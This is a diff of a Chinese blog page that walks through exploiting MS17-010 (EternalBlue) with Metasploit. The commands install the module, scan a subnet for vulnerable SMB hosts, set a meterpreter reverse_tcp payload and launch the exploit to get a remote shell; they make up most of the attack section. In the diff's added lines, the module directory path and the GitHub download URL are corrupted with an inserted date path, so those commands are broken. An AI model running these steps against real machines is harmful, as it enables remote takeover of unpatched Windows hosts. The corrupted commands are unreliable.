@@ -96,20 +96,20 @@
 <meta property="og:url" content="http://yoursite.com/2017/05/27/Metasploit中的MS17-010/index.html">
 <meta property="og:site_name" content="Note&#39;s blog">
 <meta property="og:description" content="前言MS17-010漏洞的利用可以参考之前的一篇文章，Shadowbroker工具使用方法，但每次使用，需要一台windows主机和kali同时操作，比较麻烦，目前官方还有将MS17-010的利用工具加入到MSF中，可以暂时使用网友移植的模块。">
-<meta property="og:image" content="http://yoursite.com/Metasploit中的MS17-010/安装.jpg">
-<meta property="og:image" content="http://yoursite.com/Metasploit中的MS17-010/插件.jpg">
-<meta property="og:image" content="http://yoursite.com/Metasploit中的MS17-010/启动.jpg">
-<meta property="og:image" content="http://yoursite.com/Metasploit中的MS17-010/扫描.jpg">
-<meta property="og:image" content="http://yoursite.com/Metasploit中的MS17-010/探测.jpg">
-<meta property="og:image" content="http://yoursite.com/Metasploit中的MS17-010/设置.jpg">
-<meta property="og:image" content="http://yoursite.com/Metasploit中的MS17-010/主机.jpg">
-<meta property="og:image" content="http://yoursite.com/Metasploit中的MS17-010/选项.jpg">
-<meta property="og:image" content="http://yoursite.com/Metasploit中的MS17-010/设置完成.jpg">
-<meta property="og:updated_time" content="2017-05-27T12:42:28.633Z">
+<meta property="og:image" content="http://yoursite.com/2017/05/27/Metasploit中的MS17-010/安装.jpg">
+<meta property="og:image" content="http://yoursite.com/2017/05/27/Metasploit中的MS17-010/插件.jpg">
+<meta property="og:image" content="http://yoursite.com/2017/05/27/Metasploit中的MS17-010/启动.jpg">
+<meta property="og:image" content="http://yoursite.com/2017/05/27/Metasploit中的MS17-010/扫描.jpg">
+<meta property="og:image" content="http://yoursite.com/2017/05/27/Metasploit中的MS17-010/探测.jpg">
+<meta property="og:image" content="http://yoursite.com/2017/05/27/Metasploit中的MS17-010/设置.jpg">
+<meta property="og:image" content="http://yoursite.com/2017/05/27/Metasploit中的MS17-010/主机.jpg">
+<meta property="og:image" content="http://yoursite.com/2017/05/27/Metasploit中的MS17-010/选项.jpg">
+<meta property="og:image" content="http://yoursite.com/2017/05/27/Metasploit中的MS17-010/设置完成.jpg">
+<meta property="og:updated_time" content="2017-06-22T11:15:21.626Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Metasploit中的MS17-010">
 <meta name="twitter:description" content="前言MS17-010漏洞的利用可以参考之前的一篇文章，Shadowbroker工具使用方法，但每次使用，需要一台windows主机和kali同时操作，比较麻烦，目前官方还有将MS17-010的利用工具加入到MSF中，可以暂时使用网友移植的模块。">
-<meta name="twitter:image" content="http://yoursite.com/Metasploit中的MS17-010/安装.jpg">
+<meta name="twitter:image" content="http://yoursite.com/2017/05/27/Metasploit中的MS17-010/安装.jpg">
 
 
 
@@ -420,20 +420,20 @@
 
       
         <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>MS17-010漏洞的利用可以参考之前的一篇文章，<a href="https://masterxsec.github.io/2017/04/26/Shadowbroker工具使用方法/" target="_blank" rel="external">Shadowbroker工具使用方法</a>，但每次使用，需要一台windows主机和kali同时操作，比较麻烦，目前官方还有将MS17-010的利用工具加入到MSF中，可以暂时使用网友移植的模块。<br><a id="more"></a></p>
-<h1 id="Metasploit中安装ms17-010-eternalblue-rb"><a href="#Metasploit中安装ms17-010-eternalblue-rb" class="headerlink" title="Metasploit中安装ms17_010_eternalblue.rb"></a>Metasploit中安装ms17_010_eternalblue.rb</h1><p>进入MSF中的模块目录：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> /usr/share/metasploit-framework/modules/exploits/windows/smb/</div></pre></td></tr></table></figure></p>
-<p>下载模块源文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wget https://raw.githubusercontent.com/rapid7/metasploit-framework/master/modules/exploits/windows/smb/ms17_010_eternalblue.rb</div></pre></td></tr></table></figure></p>
-<p><img src="/Metasploit中的MS17-010/安装.jpg" alt=""></p>
-<p>模块引用了ruby_smb的插件，所以我们需要安装这个插件：<br><img src="/Metasploit中的MS17-010/插件.jpg" alt=""><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gem install ruby_smb</div></pre></td></tr></table></figure></p>
+<h1 id="Metasploit中安装ms17-010-eternalblue-rb"><a href="#Metasploit中安装ms17-010-eternalblue-rb" class="headerlink" title="Metasploit中安装ms17_010_eternalblue.rb"></a>Metasploit中安装ms17_010_eternalblue.rb</h1><p>进入MSF中的模块目录：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> /usr/share/2017/05/27/Metasploit-framework/modules/exploits/windows/smb/</div></pre></td></tr></table></figure></p>
+<p>下载模块源文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wget https://raw.githubusercontent.com/rapid7/2017/05/27/Metasploit-framework/master/modules/exploits/windows/smb/ms17_010_eternalblue.rb</div></pre></td></tr></table></figure></p>
+<p><img src="/2017/05/27/Metasploit中的MS17-010/安装.jpg" alt=""></p>
+<p>模块引用了ruby_smb的插件，所以我们需要安装这个插件：<br><img src="/2017/05/27/Metasploit中的MS17-010/插件.jpg" alt=""><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gem install ruby_smb</div></pre></td></tr></table></figure></p>
 <p>以上模块就安装完成，需要注意的是，该模块暂时只支持Windows7 x64和Windows Server 2008 x64两个版本，对其他版本的支持，需要作者修改代码，本菜暂时不会。安装完成之后，可以顺便更新一下Metasploit，使用命令：msfupdate。</p>
 <h1 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h1><p>启动MSF，msfconsole：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfconsole</div></pre></td></tr></table></figure></p>
-<p><img src="/Metasploit中的MS17-010/启动.jpg" alt=""><br>搜索工具：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">search ms17_010</div></pre></td></tr></table></figure></p>
-<p>使用漏洞扫描模块：<br><img src="/Metasploit中的MS17-010/扫描.jpg" alt=""><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">use auxiliary/scanner/smb/smb_ms17_010</div></pre></td></tr></table></figure></p>
-<p><img src="/Metasploit中的MS17-010/探测.jpg" alt=""><br>option查看配置选项，需要配置的参数，RHOSTS,THREADS：<br><img src="/Metasploit中的MS17-010/设置.jpg" alt=""><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">set</span> RHOSTS 192.168.1.0/24</div><div class="line"><span class="built_in">set</span> threads 10</div></pre></td></tr></table></figure></p>
+<p><img src="/2017/05/27/Metasploit中的MS17-010/启动.jpg" alt=""><br>搜索工具：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">search ms17_010</div></pre></td></tr></table></figure></p>
+<p>使用漏洞扫描模块：<br><img src="/2017/05/27/Metasploit中的MS17-010/扫描.jpg" alt=""><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">use auxiliary/scanner/smb/smb_ms17_010</div></pre></td></tr></table></figure></p>
+<p><img src="/2017/05/27/Metasploit中的MS17-010/探测.jpg" alt=""><br>option查看配置选项，需要配置的参数，RHOSTS,THREADS：<br><img src="/2017/05/27/Metasploit中的MS17-010/设置.jpg" alt=""><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">set</span> RHOSTS 192.168.1.0/24</div><div class="line"><span class="built_in">set</span> threads 10</div></pre></td></tr></table></figure></p>
 <p>运行，开始扫描：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">run</div></pre></td></tr></table></figure></p>
-<p>如下图，扫描到ip为192.168.1.6的主机存在漏洞：<br><img src="/Metasploit中的MS17-010/主机.jpg" alt=""></p>
+<p>如下图，扫描到ip为192.168.1.6的主机存在漏洞：<br><img src="/2017/05/27/Metasploit中的MS17-010/主机.jpg" alt=""></p>
 <p>该漏洞的扫描还可以使用另一个工具：<br>ms17010scan-h-n-amd64-1.exe<br>参数介绍：<br>-h 192.168.0.2<br>-n  192.168.0.0/24<br>该工具扫描速度快，并且能够探测操作系统类型，但是不能探测操作系统位数。</p>
 <p>使用漏洞利用模块，设置payload：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">use exploit/windows/smb/ms17_010_eternalblue</div><div class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</div></pre></td></tr></table></figure></p>
-<p><img src="/Metasploit中的MS17-010/选项.jpg" alt=""><br>需要配置的选项：RHOST，LHOST。<br>设置完成：<br><img src="/Metasploit中的MS17-010/设置完成.jpg" alt=""><br>执行攻击：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">exploit</div></pre></td></tr></table></figure></p>
+<p><img src="/2017/05/27/Metasploit中的MS17-010/选项.jpg" alt=""><br>需要配置的选项：RHOST，LHOST。<br>设置完成：<br><img src="/2017/05/27/Metasploit中的MS17-010/设置完成.jpg" alt=""><br>执行攻击：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">exploit</div></pre></td></tr></table></figure></p>
 <p>执行成功之后，可以返回meterpreter。</p>
 
       
